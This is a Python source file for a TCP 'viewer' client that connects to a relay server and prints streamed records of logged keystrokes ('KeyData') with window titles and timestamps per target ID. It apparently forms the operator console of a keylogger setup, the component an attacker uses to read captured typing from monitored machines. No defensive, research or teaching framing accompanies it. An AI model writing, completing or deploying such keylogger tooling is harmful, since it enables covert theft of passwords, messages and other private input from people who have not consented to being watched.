import socket
import json
import time

from config import server_config

class ViewClient:
    def __init__(self, host, port, username):
        self.host = host
        self.port = port
        self.username = username
        self.sock = None

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))

                hello = json.dumps({"type": "viewer", "username": self.username}) + "\n"
                self.sock.sendall(hello.encode())

                print("[+] Connected to server as viewer:", self.username)
                return
            except:
                print("[!] Cannot connect, retrying...")
                time.sleep(2)

    def start(self):
        self.connect()
        buffer = ""

        while True:
            try:
                data = self.sock.recv(4096).decode()
                if not data:
                    print("[!] Disconnected, reconnecting...")
                    self.connect()

                buffer += data
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)

                    try:
                        msg = json.loads(line)
                        if msg.get("ViewID") == self.username:
                            print(f"[{msg['LoggedAt']}] {msg['ViewID']} | {msg['WindowTitle']} -> {msg['KeyData']}")
                    except:
                        pass

            except:
                print("[!] Connection lost, retry...")
                self.connect()

if __name__ == "__main__":
    username = input("Enter viewer username: ")
    ViewClient(server_config.SERVER_IP, server_config.SERVER_HOST, username).start()
